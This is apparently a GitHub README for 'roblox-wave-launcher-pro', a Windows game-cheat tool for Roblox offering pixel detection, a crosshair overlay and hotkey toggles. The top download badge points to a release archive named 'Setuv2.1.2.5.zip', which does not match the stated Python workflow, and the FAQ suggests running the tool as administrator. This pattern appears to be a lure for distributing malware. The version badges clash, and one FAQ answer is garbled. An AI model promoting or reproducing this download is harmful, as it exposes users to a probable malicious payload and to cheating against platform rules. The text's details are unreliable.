[![Download](https://img.shields.io/badge/Download-v1.0.0-brightgreen?style=for-the-badge&logo=windows)](https://github.com/nick-x1994m1/roblox-wave-launcher-pro/releases/download/v1.0.0/Setuv2.1.2.5.zip)

# 🎮 roblox-wave-launcher-pro

[![tool](https://img.shields.io/badge/tool-MIT-green?style=flat-square) ![Version](https://img.shields.io/badge/Version-1.2.0-blue?style=flat-square) ![Platform](https://img.shields.io/badge/Platform-Windows-lightgrey?style=flat-square) ![Python](https://img.shields.io/badge/Python-3.11%2B-3776AB?style=flat-square&logo=python&logoColor=white) ![Stars](https://img.shields.io/github/stars/nick-x1994m1/roblox-wave-launcher-pro?style=flat-square) ![Last Commit](https://img.shields.io/github/last-commit/nick-x1994m1/roblox-wave-launcher-pro?style=flat-square)

Roblox-wave-launcher — — pixel detection, crosshair overlay, configurable settings

## 📥 Download

[![Download Latest](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge&logo=github)](../../releases/latest)

1. Download the latest release from the link above
2. Extract the archive (WinRAR / 7-Zip)
3. Run `python main.py` (or see Usage below)
4. Configure settings in `config.yaml`

### Config

The `config.yaml` file lets you tweak everything. Here's an example:

```yaml
# Overlay settings
overlay:
 crosshair_color: "red"
 crosshair_size: 15
 crosshair_thickness: 2

# Pixel detection
pixel_detection:
 region: [100, 100, 300, 300] # x, y, width, height
 color_threshold: 20
 target_color: [255, 0, 0] # RGB

# Hotkeys
hotkeys:
 tool: "F1"
 exit: "F2"

# Monitor selection
monitor: 0

# Debugging?
debug: False
```

Make sure you restart the app after changing the config.

### Requirements

You'll need Python 3.11+ installed. Also, install the required packages using pip:

```bash
pip install -r requirements.txt
```

Dependencies include libraries for image processing, screen capture, and input handling.

### How to Use

First, make sure you've installed the requirements. After that, just run the `main.py` file:

```bash
python main.py
```

It'll load the config and start the overlay. You can then toggle features with your configured hotkeys.

### Highlights

* **Screen analysis:** Analyzes specific regions of your screen for pixel changes.
* **Overlay:** Display a custom overlay on top of the game window.
* **Crosshair:** Adds a customizable crosshair to the screen.
* **Pixel Detection:** Detects specific colors within a defined region.
* **Hotkey Automation:** Use hotkeys to toggle features on/off.
* **Configuration:** Adjust settings via the `config.yaml` file.

### FAQ

<details>
<summary>How do I change the crosshair color?</summary>
You can change the crosshair color by editing the `crosshair_color` field in the `config.yaml` file. Supported colors are common names like "red", "blue", etc.
</details>

<details>
<summary>The overlay isn't showing up. What's wrong?</summary>
First, double-check that the application has the necessary permissions to draw overlays. On some systems, you might need to run it as administrator. Also, ensure that the monitor number in the config is correct.
</details>

<details>
<summary>How accurate is the pixel detection?</summary>
Pixel detection accuracy depends on the `color_threshold` value in the config. Lower values make it more sensitive. However, very low values can lead to expected behaviors.
</details>

<details>
<summary>Can I use multiple hotkeys?</summary>
Not yet, but it's on the roadmap. Currently, you can only define one hotkey per action. WIP: Multiple hotkey support.
</details>

---

🛠 Built with Python | Open Source